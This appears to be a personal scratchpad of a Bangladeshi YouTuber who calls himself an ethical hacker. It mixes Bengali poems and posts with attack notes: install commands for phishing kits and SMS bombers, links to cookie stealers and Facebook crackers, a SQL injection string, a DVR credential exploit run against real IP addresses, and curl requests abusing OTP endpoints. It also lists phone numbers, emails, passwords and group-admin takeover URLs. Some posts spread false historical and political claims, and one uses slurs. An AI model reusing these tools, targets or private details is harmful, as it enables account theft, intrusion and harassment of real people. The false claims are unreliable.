+╚═╝░░╚═╝╚═════╝░╚═╝░░░░░╚═╝
+
+https://m.facebook*com/group/add_admin/?group_id=572282840311724&user_id=100028802598241&
+
+
+
+https://www.facebook.com/groups/572282840311724/permalink/572282850311723/?app=fbl
+
+
+
+https://www.facebook.com/100028802598241/posts/294495811520503/?substory_index=0&app=fbl
+
+
+
+
+
+
+
+
+
+
+
+
+ai.kiron.info@gmail.com Aminul Islam
+
+01754877124
+54523767
+
+01754877124
+
+Aminul Islam 
+
+ai.kiron.info@gmail.com Aminul Islam
+
++8801838395957
+
+pkg install git python php curl openssh grep && pip3 install wget && git clone https://github.com/DarkSecDevelopers/HiddenEye && cd HiddenEye && chmod 777 HiddenEye.py && python HiddenEye.py 
+
+
+Italia Cyber Army Team
+
+https://l.facebook.com/l.php?u=https%3A%2F%2Fgithub.com%2FErr0r-ICA%2FVARIOUS&h=AT3C3jWIjxgU3ZMLouC1_3lZIbmEMUaCJG3zQhRrVRphJ3YOjaifYXdx1qYOGMtGaCmTo0g-Zh5DYrpAlDwMqx25FhPGIzXYpGdHDQC74VAgVxTLsqZ1qTuo0UFsiFyxKM5sfB2tiw
+https://github.com/Err0r-ICA/VARIOUS
+
+https://bestcena.sk/mobilne-telefony/apple-iphone-11-pro-64gb-green
+
+
+
+https://github.com/Binyamin-binni/bn
+
+
+
+https://github.com/Binyamin-binni/bxi
+
+
+https://github.com/BangDanz/Tool-A
+https://github.com/beast-dev/tracer
+https://github.com/htr-tech/nexphisher
+https://github.com/Xyl2k/Cookie-stealer 
+https://github.com/AXDOOMER/easy-xss-cookie-stealer
+Account: abmmujahid@engineer.com
+https://github.com/jofpin/trape
+
+python2 trape.py --url http://techpurbd.tk --port 8080
+
+
+
+http 127.0.0.1:5555
+100038475560282
+
+15%3AgVdu6fnEjdjJjg%3A2%3A1587726263%3A4626%3A5365
+
+
+100038475560282
+
+
+
+12%3AFh2Yj35Dcrd9pg%3A2%3A1587720758%3A4626%3A5365
+
+100028802598241
+
+
+
+
+
+
+
+
+17%3AlLHwTMh8cNq96A%3A2%3A1587696799%3A4626%3A5365
+.
+
+9%3Ak4q2UGNLARZoaQ%3A2%3A1587697680%3A4626%3A5365
+
+https://m.facebook.com/group/add_admin/?group_id=572282840311724&user_id=100038475560282&added
+
+https://github.com/shadsidd/Automated-XSS-Finder
+Premiere in progress. Started 4 minutes ago
+
+মৃত্যুবন্যা, ভয়াল প্লাবন, ভেসে গেলো লাখো প্রাণ, আমার
+চেতনার হুশ ফেরাতে কি তবে এলো মাহে রমজান?
+জানি না সেকথা, দেখিনি আমি নতুন দিনের চাঁদ
+আমার আকাশে এখনো আধার আর কিছু অবসাদ।
+
+হয়নি আজাদ, শিশুর অধরে বির বির রাগ শুনি
+আসমানী বুকে এক ফালি চাঁদ, হাজার ব্যাথার খনি
+জীবনে যাদের প্রতিদিন রোজা, ক্ষুধার সঙ্গে বাস
+মৃত্যুর সাথে এক ঘাটে যারা ওজু করে বারো
+যে খোকা মরিলে কুকুর ভিন্ন কাদে না একটি মন
+তাদের জন্য নতুন করে কি রমজান প্রয়োজন? 
+
+শ্রমিকের বুকে জমাট রক্ত দেখতে পায় না কেউ
+অস্রু সলিলে পাক দিয়া উঠে সাত দরিয়ার ঢেউ
+ছোটো খোকাটার অসুখ হয়েছে মরবে মরবে ভাব
+এখনো যে তার পাওনা দিলোনা শহরের বাবু সাব
+
+এক ফালি চাঁদ আকাশে ফুটেছে মনেতে ফুটেনি তার
+মৃত পুত্রের জানাজা পরে সে করে নাই ইফতার
+
+ভূমিহীন চাষী অন্যের ক্ষেতে ফসল করেছে চাষ
+অভাবের সাথে পাঞ্জা লড়ে সে টিকে থাকে বারোমাস
+চাতাল ব্যাপারী নিয়ে যায় ধান পানির মূল্য দিয়ে
+তাদের কি আর কিছু আসে যায় নয়া রমজান পেয়ে।
+
+কোথায় ইমাম? কোথায় নেতা?  কোথায় বাংলাদেশ
+চেতনার জলে সাতার কাটিয়ে হাপায়া উঠেছি বেশ
+চারিদিকে শুধু জীবন্ত লাশ, মৃত্যুর দিন গুনে
+আছে কোনো নেতা নিকটে আসিয়া মানুষের কথা শুনে?
+
+নিঙরিয়া পড়ে হাদিস কোরান মাওলানা বেশ খুব
+কোন আয়াতের ওজরে তুমি হে থাকো আজ নিশ্চুপ?
+তোতাপাখি হয়ে সবক নিয়েছে চিন্তা করেনি তাই
+দুর্বল বুকে  হিংসা ঘুমায় গতরে শক্তি নাই
+
+তাহারি খুৎবা গিয়েছে থেমে, শুনে না আজ তা কান
+বুঝেনা বেকুব ইমামের দল নিজেদের অপমান
+নিজেকে যেজন চিনে না সেজন অধম শক্তিহীন
+তারি পিছু কভু কাতার বাধে না মুমিন মুত্তাকিন
+
+শোন নির্বোধ! এই দুনিয়ায় বিশ্বাসী যার নাম
+আমৃত্যু সেই চালিয়ে গিয়েছে শান্তির সংগ্রাম
+আল্লার নামে জিকির করেছো তসবির মালা গেধে
+সেই আল্লাকেই পারো নি রাখতে আপন মনেতে বেধে
+পুটলায় যার রুটি নাই সে কীভাবে করবে দান
+কিতাব পড়ে সে হুজুর হয়েছে হয় নাই ওসমান
+
+অন্ধ যেজন সেজন কভু কি রাস্তা দেখাতে পারে?
+সেইতো আজিকে নেতা হয়ে ছুটে গহীন অন্ধকারে
+চারিদিক কালো বেদনায় ঘেরা, জনসাধারণ মাঝে
+এদের ভেতরে কজন বলো সরল অংক বুঝে?
+
+আনিবে কে আজ রমজান শেষে ঈদের চাদের হাসি?
+মুছে দিবে যত বেদনা বুকেতে জড়ায়া কাদছে চাষি
+মৃত্যুবন্যা থামাবে কে আজ? আসবেন তিনি কবে
+সেদিন মোদের জীবনে সবার ঈদুর ফিতর হবে।
+
+Kw : Gully Boy, Gully Boy Rana, Ami Rana Gully Boy, Tabib Mahmud, Rana New Song, Bangla Rap, Rap Song, Bangla Hip Hop Song,  Bangla Song, Bangla Song, Rana Mridha, Dhakaiya Gully Boy
+
+#Tabib #Poetry #Ramdan
+
+https://github.com/haroonawanofficial/XSS-Finder
+
+
+https://free.facebook.com/group/add_admin/?group_id=572282840311724&user_id=100038475560282&added&_rdr
+
+
+https://free.facebook.com/group/add_admin/?group_id=424500251527566&user_id=100028802598241&added&rdr
+
+
+
+https://free.facebook.com/group/add_admin/?group_id=424500251527566&user_id=100028802598241&added&_rdr
+
+install clang
+
+https://github.com/TheAahil/cloner
+
+ https://github.com/TheAahil/Dark-pak
+
+https://www.facebook.com/profile.php?id=100049904861921
+
+/storage/emulated/0/Download/Dark-pak-master.zip
+
+https://www.facebook.com/groups/539557733436157/permalink/604323593626237/?app=fbl
+
+
+pkg install git php curl openssh grep && git clone -b Termux-Support-Branch https://github.com/Ignitetch/AdvPhishing 
+
+
+👉 Zpisher Pishing Tool Install: https://youtu.be/6sdkvMLA6pE
+
+👉 HiddenEye Advance Pishing Tool: https://youtu.be/dOx-64ICKZY 
+
+https://github.com/Ignitetch/AdvPhishing
+
+https://github.com/thelinuxchoice/locator
+
+https://www.facebook.com/profile.php?id=100049904861921
+
+..
+https://www.facebook.com/delwar.sarker
+
+https://www.facebook.com/100001446252550/posts/3078898555501656/?app=fbl
+
+pkg install git php curl openssh grep && git clone -b Termux-Support-Branch pkg install git php curl openssh grep && git clone -b Termux-Support-Branch https://github.com/DarkSecDevelopers/HiddenEye && chmod 777 HiddenEye && cd HiddenEye && python HiddenEye.py && chmod 777 HiddenEye && cd HiddenEye && python HiddenEye.py
+
+
+
+https://github.com/thewhiteh4t/seeker
+
+https://github.com/mathiasbynens/base64
+
+https://www.facebook.com/profile.php?id=100049904861921
+/storage/emulated/0/abm.txt
+
++16206075456
+https://www.facebook.com/groups/sidhu3470/permalink/2972936106062946/?app=fbl
+https://www.facebook.com/nizam.rabby.9
+
+https://free.facebook.com/groups/BYERTHO.PREM/permalink/722978564934495/?app=fbl
+https://github.com/kangcoli/jb
+https://www.facebook.com/profile.php?id=100038690796162
+https://r-static-assets.androidapks.com/rdata/23b3839659f0aba663208c1098b539f4/com.enflick.android.TextNow_v20.2.0.1-13121_Android-4.4.apk
+
+
+https://m.youtube.com/channel/UCCVaRwT4qQVJIzn-oLu38-A#dialog
+
+Mahima sultana suma
+
+
+🆕 Welcome To TerMuX ✔✔
+
+           ✴✴✴✴✴✴✴✴✴✴✴✴✴✴✴✴
+
+                  👀
+               💀CCE8💀
+
+          ◀[Ethical Hackers]▶
+            ↘             ↙
+      ✳✳  Subscribe TechPurBD  ✳✳
+
+
+          ✖   Abm Mujahid   ✖
+   ✴✴✴✴✴✴✴✴✴✴✴✴✴✴✴✴✴✴✴✴✴✴✴✴✴✴✴✴✴✴✴
+
+
+
+
+
+
+🚫🔗⏩
+
+🔗CCE8 ⏩
+
+💻📱💿⏬
+
+
+🌍 www.TechPurbd.Tk
+🚩 Facebook.com/HackerAbm
+📧 abmmojahid@gmail.com
+
+
+https://m.facebook.com/help/contact/233841356784195
+
+
+
+
+
+#April_Full😊
+• এটা লাভ স্টরি না! 
+★ পহেলা এপ্রিলে স্পেনের রানি ইশাবিল্লা হটাৎ মুসলমানদের মারার জন্ন্যে হুকুম করেন। তারপর স্পেনে সব মসুলমানকে মারা শুরু করল। মুসলমান যেকানেই পাই সেখানেই মেরে ফেলে। তারা প্রস্তুত ছিল না। তখন মুসলমান হতাস হয়ে পরে।
+★ রাণী ইশাবিল্লা ঘোষণা করেন, Cordoba মাসজিদে যারা আশ্রয় নিবে তাদেরকে নিরাপত্তা দেয়া হবে।<[মসজিদটি তারেক বিন জিয়াদ তৈরী করেছিলেন। ১লক্ষ মানুষ এক সাথে নামাজ পড়তে পারে]> আর বুমদ্দো সাগরে (Mediterranean sea) দুইটা জাহাজ রাখা আছে, নারী ও শিশুদেরকে অন্ন দেশে পাঠিয়ে দেয়া হবে। এই ঘোষণা শুনার পর ৪০হাজার মুসলিম মসজিদে আশ্রয় নিলেন ও জাহাজে হাজার হাজার নারী ও শিশু উঠলেন। 
+★ জাহাজ গুলো ছিলো ফুটু,  জাহাজ ডুবে হাজার হাজার নারী শিশুর মৃত্যু হয়। 
+★৪০ হাজার মুসলিম মসজিদে ঢুকার পর দরজা বন্ধ করে আগুন লাগিয়ে দেয়। 
+• মরে গেলো মুসলমান। 
+★নারী শিশু পুরুষ সবাই খুশি হয়েই জাহাজে ও মাসজিদে ঢুকে ছিলো। যখন দেখলো জাহাজ পানিতে ডুবে যাচ্ছে আর মসজিদে আটকে রাখে আগুন জ্বালিয়ে দিয়েছে আর এটাই হল #Aripl_Full
+★ পোস্ট টা শেয়ার দিতে শয়তানে বাঁধা দিবে,  বাকিটা আপনাদের উপর। 
+
+★ বিদ্রঃ এই পোস্ট যদি মিথ্যা মনে হয় goole এর হ্লেপ নিতে পারেন। 
+
+
+
+
+
+
+
+
+1.Bateje +crush.....😀
+2. FB tei😍
+3.Jode romantic kota bolte eitai amar valo lagto...😊😊
+4.Duniyar soytan+valo😍
+5. hmm.....paro....crush bole kota...!!
+
+
+
+https://www.onlinefreecourse.net/facebook-gmail-account-hacking-course-in-ethical-way-udemy-free-download/
+
+http://securityowned.blogspot.com/2011/09/facebook-hacking-complete-guide.html?m=1
+
+https://www.newtechenterprises.co.in/adminlogin.php
+
+
+Hi... All.....😍
+
+
+
+
+
+https://m.facebook.com/help/contact/233841356784195?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2Fdevice-based%2Fpassword%2F&_rdr
+
+
+
+https://github.com/Ha3MrX/DDos-Attack
+
+
+01313178277
+
+01726450959
+
+★Facebook Script download: https://youtu.be/HSJF29Mk93Q
+
+★Facebook Script Hosting: https://youtu.be/H7rxihBk3FY
+
+★ করোনা: 
+
+https://github.com/TheSpeedX/TBomb
+apt update && apt upgrade
+https://www.facebook.com/100027788477328/posts/536401250629486/?substory_index=1&app=fbl
+https://www.facebook.com/100038475560282/posts/197858804839970/?app=fbl
+https://www.facebook.com/100001446252550/posts/2969570349767811/?app=fbl
+
+
+
+https://www.facebook.com/100030094961903/posts/e/?app=fbl
+
+https://www.facebook.com/100014824188547/posts/818968085273990/?app=fbl
+
+https://www.facebook.com/100028802598241/posts/290166498620101/?substory_index=0&app=fbl
+
+
+https://www.facebook.com/100033394762121/posts/212151073241383/?app=fbl
+https://www.facebook.com/100012546974234/posts/921672294927661/?app=fbl
+
+https://www.facebook.com/100045978661676/posts/100596358149653/?app=fbl
+
+https://github.com/Binyamin-binni/bn
+
++17014983668
+
+1. pkg update && pkg upgrade
+
+    1'or'1'='1
+
+https://www.facebook.com/100038475560282/posts/221161135843070/?app=fbl
+shodan requests prompt_toolkit wget beautifulsoup4 click urllib3 IP2proxy wget paramiko h8mail nmap pythonping whois gmplot pillow lxml
+
+
+https://github.com/spider-fb/spider-fb
+
+2. pkg install python
+
+3. pkg install python2
+
+4. pkg install git
+
+5. pip2 install requests
+
+6. pip2 install mechanize
+
+apt update && apt upgrade && apt install python python2 git  -y && pip2 install requests mechanize request beautifulsoup4 setuptools get
+
+
+
+&& git clone https://github.com/XIDIPAKISTANI/ && cd xidi && python2
+
+
+
+apt update && apt upgrade && apt install python python2 git -y && pip2 install requests mechanize && git clone https://github.com/XIDIPAKISTANI/xidi && cd xidi && python2 xp.py
+
+
+
+
+
+
+https://www.facebook.com/100038475560282/posts/200886127870571/?app=fbl
+pkg install ruby
+
+pkg install python2 -y
+
+pkg install git -y
+
+https://github.com/Binyamin-binni/bn
+
+cd bn
+
+ls
+
+pip2 install mechanize
+
+pip2 install requests 
+
+python2 bn.py
+
+
+
+https://github.com/bhavsec/reconspider
+
+
+
+git clone https://github.com/fatonicyber/pakistan1
+
+ls
+
+cd pakistan1
+
+ls
+
++17013534752. .  +17014983668
+
+chmod +x *
+
+python2 pakistan1.py
+
+
+hereby retract my claim of copyright infringement
+
+curl -X POST -H "Host:www.fbbonline.in" -H "Connection:keep-alive" -H "Content-Length:430" -H "Sec-Fetch-Mode:cors" -H "X-NewRelic-ID:VQ8PVlFUChABV1ZRBgYCX1w=" -H "Origin:https://www.fbbonline.in" -H "User-Agent:Mozilla/5.0 (Linux; Android 10; Nokia 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36" -H "Content-Type:application/x-www-form-urlencoded; charset=UTF-8" -H "Accept:application/json, text/javascript, */*; q=0.01" -H "X-Requested-With:XMLHttpRequest" -H "Save-Data:on" -H "Sec-Fetch-Site:same-origin" -H "Referer:https://www.fbbonline.in/customer/account/create" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7" -H "Cookie:PHPSESSID=qp7enrq8b5r9r4pflvcqq9aeo3; _st_time=1582891624; _fv=cmpnpp; registration_url_cookie=https%3A%2F%2Fwww.fbbonline.in%2F; _fbp=fb.1.1582891635059.470590345; all_store_details=null; _ga=GA1.2.125765853.1582891638; _gid=GA1.2.1628683861.1582891638; _gat=1; historyPlpPage=0; _hjid=58792598-5993-4bdf-b526-6c1bb14fefb5; __stdf=0; __stbpnenable=1; __stgeo="denied"; __stat="BLOCK"; __stp={"visit":"returning","uuid":"dafdf16a-054e-4ee9-a123-7c9b55a07f3d","ck":"8127378652"}; __sts={"sid":1582891654658,"tx":1582891654658,"url":"https%3A%2F%2Fwww.fbbonline.in%2Fcustomer%2Faccount%2Fcreate","pet":1582891654658,"set":1582891654658}" -d "YII_CSRF_TOKEN=7abed645867860ee429651535ff38b23412e9d59&RegistrationForm%5Bsignup_page%5D=1&RegistrationForm%5Bcontact_number%5D=+8801706433237&RegistrationForm%5Bvalid_mobile%5D=1&RegistrationForm%5Bemail%5D=sonuv0085%40gmai.com&RegistrationForm%5Bvalid_email%5D=1&RegistrationForm%5Bfirst_name%5D=Ritik&RegistrationForm%5Blast_name%5D=Vushjg&RegistrationForm%5Bpassword%5D=9455688381&RegistrationForm%5Btc_opt_in%5D=on&validate_otp=" "https://www.fbbonline.in/customer/account/GenerateOtp"
+
+curl -X POST -H "Host:accounts.justdial.com" -H "Connection:keep-alive" -H "Content-Length:18" -H "Accept:application/json, text/javascript, */*; q=0.01" -H "Origin:http://accounts.justdial.com" -H "X-Requested-With:XMLHttpRequest" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36" -H "Content-Type:application/x-www-form-urlencoded; charset=UTF-8" -H "Referer:http://accounts.justdial.com/hr_dashboard_services/jdtest/register?mobile=NzYyMTA1Nzk0MQ==&id=MC4zMTU5MDkwMCAxNTY4NzAxODUyfEB8K%2FlonurGfX0%3D&city=" -H "Accept-Encoding:gzip, deflate" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6,ar;q=0.5" -H "Cookie:PHPSESSID=9ov0jkdfs1k3ipph0pi3nb9aa4" -d 'mob_num=01706434237' "http://accounts.justdial.com/hr_dashboard_services/jdtest/sendsms_registration"
+
+
+
+
+
+Hello dear,
+I am Abm Mujahid. I have a request that will you please remove your strike from my video.
+Because it's just for.............Purpose Not for Monetization.
+I am New creator on YouTube so  I don't had more info about terms & conditions.
+
+Dear YouTube, 
+
+Sir, I am Abm Mujahid. "Aiplex Software Private Limited" This company gives a copyright strike on my video. I am not copying any music or video or pictures of this company from Aiplex Software Private Limited in this video. I "Aiplex Software Private Limited" This company does not copy anything, they are giving me a copyright strike on my video. So, Dear Youtube team, I request you, please verify the video again. 
+Below is my video and all my information.
+
+Video details:-
+
+Video link : https://www.youtube.com/watch?v=qInHo9ppnEc
+
+Video ID: qInHo9ppnEc
+
+Channel link: https://www.youtube.com/AbmPurBD
+
+My Details: 
+Name: Abm Mujahid
+Mobile: +8801706434237
+Email: techpurabm@gmail.com
+Country: Bangladesh
+
+
+So,
+I request you to Please retract the claim. 
+
+
+
+It will never happen again,so Very very sorry if i made any mistakes.
+Thanks dear I hope you will response on that.
+
+"PLEASE DO LIKE,COMMENTS & SHARE AND DON'T FORGET TO SUBSCRIBE MY CHANNEL "
+
+
+
+
+https://github.com/vaimpier-ritik/Metasploit-Installation
+
+
+As long as you have modified the original content in some way, such as in a remix, it is always a fair use of copyrighted material and you cannot be subject to claims of copyright infringement.
+
+
+Aiplex Software Private Limited 
+
+copyright@youtube.com
+
+
+https://github.com/krashman/infinity
+বড় মনের কিছু মেয়েদের জন্যই কিছু ছেলে  সিঙ্গেল  থেকে ডাবল হওয়ার সুযোগ পায়..!! তাদের মনে কোনো হিংসা নেই...! সব ছেলেরাই তাদের চোখে সমান, ে 
+
+
+
+
+
+Virginity নষ্ট করে Fbতে ভালো হয়ে যাওয়ার States দিলেই হয়তো Virginity ফিরে আসে...! 
+
+
+nahia@kpay.be
+
+
+88.247.71.232
+88.249.87.250
+
+mohibur.nobosur.no1
+
+https://mobile.facebook.com/messages/read/?tid=cid.c.100037543209889%3A119829066092921&pageID=119829066092921&env=messenger&entrypoint=web%3Atrigger%3Athread_list_thread#fua
+
+
+https://mobile.facebook.com/profile.php?id=100028409349331&_rdc=1&_rdr
+
+01749794212 password 242829
+100028409349331
+
+
+python getDVR_Credentials.py --host 78.189.195.190 --p 80
+
+python getDVR_Credentials.py --host 88.247.71.232 --p 8100
+getDVR_Credentials.py
+
+python getDVR_Credentials.py --host 88.249.87.250 --p 80
+
+python getDVR_Credentials.py --host 121.181.1.197 --p 80
+
+
+
+https://github.com/ezelf/CVE-2018-9995_dvr_credentials
+
+
+
+.
+BSSID :  b0:4e:26:59:03:6c
+Channel :  11
+[WPA2-PSK-CCMP][WPS][ESS]
+https://github.com/thelinuxchoice/facebash
+৫ টাকার কাগজ ২ টাকার কালি দিয়ে তৈরি একটা Certificate মেধা যাচাই এর কোন যোগ্যতা নেই...!!😊😊
+https://github.com/warifp/FacebookToolkit
+https://github.com/Hack-with-Github/Awesome-Hacking
+https://www.hackingtools.in/free-download/browser-addons/
+pkg install python -y 
+pkg install python2 -y
+pkg install git -y
+git clone https://github.com/sundowndev/PhoneInfoga
+pip install -r requirements.txt
+python3 -m pip install -r requirements.txt
+chmod 777 *
+cp config.example.py config.py
+
+
+python3 phoneinfoga.py -v
+python3 phoneinfoga.py -n +8801900000000
+https://github.com/thehackingsage/hacktronian
+https://github.com/sundowndev/PhoneInfoga
+
+গনি 
+
+https://github.com/maldevel/IPGeoLocation
+https://whatismyipaddress.com/ip/119.30.46.125
+
+Tech Pur BD, tech pur bd, techpur bd, tech bd, tech pur, TechPur BD, Tech Pur, BD tech Pur, Abm Mujahid, abm mujahid, abm mojahid, mujahid abm, CCE8, #CCE8, Abm Pur BD, 
+
+
+- ধরো আমি তোমার bf☺
+
+- ধরেছো যখন তাহলে আর ছাড়ার দরকার নেই🐸
+
+
+https://github.com/Ha3MrX/Gemail-Hack
+
+
+Md Riyad Khan
+
+https://accounts.google.com/AccountChooser?Email=riyadkhan55336688@gmail.com&continue=https://myaccount.google.com/alert/nt/1582721779441?rfn%3D4%26rfnc%3D1%26eid%3D7499009103486937536%26et%3D0
+
+05/01/2000(sotik mone nei
+
+
+http://free.facebook.com/hacked/disavow?u=100011476179388&n=Dab1fq3g&l=en_GB&ext=1583143031&hash=AS_7stWgpX8j2h05
+
+
+
+
+
+
+
+
+ 103.127.57.250
+
+http://103.127.57.174
+
+https://github.com/ezelf/CVE-2018-9995_dvr_credentials
+
+https://github.com/d3L3t3dOn3/Malicious
+
+https://github.com/RitwikGA/FacebookReportingTool
+
+যে কুত্তার বাচ্চা,  জারজ, ফোটা কনডেমের জন্ম গুলো আল্লামা দেলোয়ার হোসেন সাইদির কে রাজাকার ধর্ষক বলোস.... দেখ এই ভিডিওটা....
+বিদ্রঃ আমি শিবিরে ভর্তি হতে এই ভিডিও টা Upload  করছি না....!!  এই কুরআনের পাখিটার সম্পর্কে কেউ কিছু বললে সহ্য করতে পারি....!!!
+
+wifi hack,
+wifi hacking protection,
+wifi hack করার কৌশল,
+wifi hack করার উপায়,
+wifi hacker apk,
+wifi hacker video,
+wifi hacker app download,
+wifi hack in pc,
+wps office how to use,
+wps wpa tester android 9.0,
+wps pin দিয়ে wifi connect,
+wps button on router,
+wps pin to password,
+wps pin connect wifi,
+ফ্রী ওয়াইফাই ব্যবহারের অনেক ভিডিওই ইউটিউবে আছে। এমনকি পাশের বাসার ভাই বা নিজের বন্ধুও wifi চুরি করে ফ্রী ব্যবহার করেছে। কিন্ত সবারই জানার আগ্রহ থাকে, কার্যকর পদ্ধতি কোনটা? কিভাবে আমরা নিজেরাও ফ্রী চালানোর জন্য সঠিকভাবে চেষ্টা করতে পারি? সেইজন্য আজকের চমৎকার ভিডিও! এই ভিডিওতে ফ্রী ওয়াইফাই চালানোর জন্য অনেক গুলো  কার্যকর পদ্ধতি দেখানো হয়েছে।
+
+
+[বিশেষ দ্রষ্টব্য: এটা কোনো প্রকার অবৈধ বা হ্যাকিং টিউটোরিয়াল নয়, আইটেক স্কুল (TechPur BD) ইউটিউব চ্যানেল কোনো অবৈধ কিছু শিক্ষা দেয় না বা অবৈধ কোনো কাজে উৎসাহীত করে না,
+
+এই ভিডিওতে শিক্ষা মুলক উদ্দেশ্যে ঝামেলা ছাড়াই ওয়াইফাই পাসওয়ার্ড বের করার পদ্ধতি এবং কিভাবে ফ্রী ওয়াইফাই চালানো যায় সেই পদ্ধতি সম্পর্কে ধারণা দেয়া হয়েছে। দর্শকগণ ভিডিওটি দেখার পর তাদের ওয়াইফাই এর দুর্বলতা খুজে বের করতে পারবে এবং ঠিক করে নিতে পারবে। তাছাড়াও সবাই বুঝতে পারবে যে আসলে সাধারণত কিভাবে সাধারণ মানুষ অন্যের wifi চুরি করে ফ্রীতে ব্যবহার করে। ভিডিওটি ইউটিউবের নিয়মাবলী অনুসরণ করে বানানো,তাই সরাসরি কোনো অবৈধ কিছু শিখানো হয়নি। শুধুমাত্র শিক্ষামুলক উদ্দেশ্যে ধারণা দেয়া হয়েছে। এবং এই ভিডিও দেখে কেউ কোনো ভাবে অন্যের ক্ষতিসাধন করতে পারবে না। বরং নিজে নিরাপদ থাকতে পারবে। ]
+
+
+
+
+
+
+_     ___   __  __   __  __   _   _      _     _     _  _   ___   ___
+  /_\   | _ ) |  \/  | |  \/  | | | | |  _ | |   /_\   | || | |_ _| |   \
+ / _ \  | _ \ | |\/| | | |\/| | | |_| | | || |  / _ \  | __ |  | |  | |) |
+/_/ \_\ |___/ |_|  |_| |_|  |_|  \___/   \__/  /_/ \_\ |_||_| |___| |___/
+
+
+           
+🆕 Welcome To TerMuX
+          ✴✴✴✴✴✴✴✴✴✴✴✴✴✴✴✴
+                                👀
+                          💀CCE8💀
+
+🇧🇩🇧🇩       ◀[Ethical Hackers]▶       🇧🇩🇧🇩
+                         ↘                 ↙
+           ✳✳   SubscribeTechPurBD   ✳✳
+
+
+
+
+
+... .   .           .                
+                    🔴🔵   Abm Mujahid☑  🔵🔴
+           ✴✴✴✴✴✴✴✴✴✴✴✴✴✴✴✴
+
+
+
+
+
+
+
+
+
+figlet -f small SUBSCRIBE TECHPURBD
+
+Video-1: https://youtu.be/vbOy1C4Rzgw
+Video-2: https://youtu.be/8zqPiWHrUQc
+Video-3: https://youtu.be/EQNAsxmp1nM
+
+গতকাল রাতে আমার রুমে কে যেন দরজা ভেঙ্গে ঢুকে আমার laptop, Mobile phone,Taka poysa সব নিয়ে গেছে 😣🙄
+কিন্তু দুর্ভাগ্যবশত!!!!! বেচারা তার মোবাইল টি টেবিলের উপরে রেখে গেছে 😂 আমি জানি সে কে 🙄🙄
+কিন্তু লজ্জায় কিছু বলতেও পারছি না 😤
+আমি তার ফেসবুক আইডির লিঙ্ক সহ দিলাম।
+সবাই লিংকে ক্লিক করবেন 
+মাথায় আকাশ ভেঙে পরতে পারে😫আপনারা সবাই তাকে চিনেন 😳😳
+
+👇👇👇👇👇👇👇👇👇👇👇 
+https://www.facebook.com/profile.php
+
+
+
+
+
+
+
+
+
+
+
+"""15643%%##@@""
+BcC6856454
+
+
+https://github.com/thelinuxchoice/locator
+
+pkg update && pkg upgrade
+pkg install php openssh curl wget
+pkg install python
+git clone  https://github.com/Cesar-Hack-Gray/scam
+cd scam
+bash install.sh
+./phishing.sh
+
+
+html:/login.rsp
+
+https://github.com/Ha3MrX/facebook-cracker
+
+
+
+https://www.youtube.com/redirect?q=https%3A%2F%2Fdrive.google.com%2Ffile%2Fd%2F1JCmac9qf4g4-Yx7mmLqM-zZt3pc5_5eW%2Fview%3Fusp%3Ddrivesdk&event=video_description&redir_token=o69SSA_OsVdJ_I5kycN-xbniIjZ8MTU4MTU3Mzc4NUAxNTgxNDg3Mzg1&v=O1HjIpP5Nbc&html_redirect=1
+
+
+
+https://myaccount.google.com/u/2/?utm_source=OGB&tab=kk&utm_medium=act
+_   _          __  __       _      _    _    _
+  /_\ | |__ _ __ |  \/  |_  _ (_)__ _| |_ (_)__| |
+ / _ \| '_ \ '  \| |\/| | || || / _` | ' \| / _` |
+/_/ \_\_.__/_|_|_|_|  |_|\_,_|/ \__,_|_||_|_\__,_|
+
+
+fe80::c2c9:76ff:fe34:f2d7
+192.168.0.104
+
+u'http://124.6.239.198:8001')
+
+
+
+https://github.com/chinoogawa/fbht
+_   _          __  __       _      _    _    _
+  /_\ | |__ _ __ |  \/  |_  _ (_)__ _| |_ (_)__| |
+ / _ \| '_ \ '  \| |\/| | || || / _` | ' \| / _` |
+/_/ \_\_.__/_|_|_|_|  |_|\_,_|/ \__,_|_||_|_\__,_|
+                            |__/
+
+
+apt update && apt upgrade
+pkg install python2
+pkg install git
+git clone https://github.com/fatonicyber/pakistan1
+cd pakistan1
+pip2 install mechanize
+pip2 install requests
+ls
+chmod +x *
+python2 pakistan1.py
+FATONICYBER
+MR.BLACK0304
+1246477
+rkhgjbgfh
+47774
+abm55336688
+55336688abm
+abm3355668
+33556688abm
+/storage/emulated/0
+
++17017658756
+https://www.facebook.com/groups/BYERTHO.PREM/permalink/688772355021783/?app=fbl
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+http://192.168.0.1/cgi/conf.bin?
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+https://www.facebook.com/groups/546870599252759/permalink/552403605366125/?app=fbl
+
+
+
+WPS PIN :  58335802 >58335802
+
+https://github.com/Squuv/WIFI-Brute-Force
+
+
+taiba123
+taiba017
+taiba018
+raha123
+
+
+
+
+যদি কাউকে ধোঁকা দিতে পারেন,,,, , তাহলে ভাববেনা সে বোকা ছিলো.. মনে রাখবেন সে আপনাকে বিশ্বাস করে ছিলো,, কিন্তু আপনি তার সেই বিশ্বাসের যোগ্য ছিলেনা..!!
+
+
+
+
+
+
+       ÄBM MŮĴÄȞÏĐ
+
+
+.. 
+
+
+https://github.com/evait-security/weeman
+জান্নাতুল মাহি. . 1 hour ago. . ১০০% সত্যি জানুন।
+
+
+
+বোরহান ওয়ানি ছিল হিজবুল্লা সংঘঠনের প্রধান কমান্ডার।
+যে পুরো কাশমির কে রক্ষা করত।সে পাকিস্তানের নাগরিক,,পুরো ইন্ডিয়া তার জন্য ভয়ে কাপত,,অবশেষে রাতের আধারে তাকে জংগি বলে ইন্ডিয়ান আর্মি  গুলি করে হত্যা করে ২০১৬ সালে।
+
+যেহেতু ফেসবুকের কিছু শেয়ার ইন্ডিয়া কিনে নিয়েছে,,তাই ইন্ডিয়া চায়না তার ছবি কোনো প্রোফাইলে থাকুক।এই জন্য এই ছবি আপলোড দিলে জংগি বলে আপনার আইডি টি নষ্ট হয়ে যায় অটোমেটিক।এবং কি এই ছবি কোন গ্রুপে দিলে সেই গ্রুপ ও নষ্ট হয়ে যায়।
+
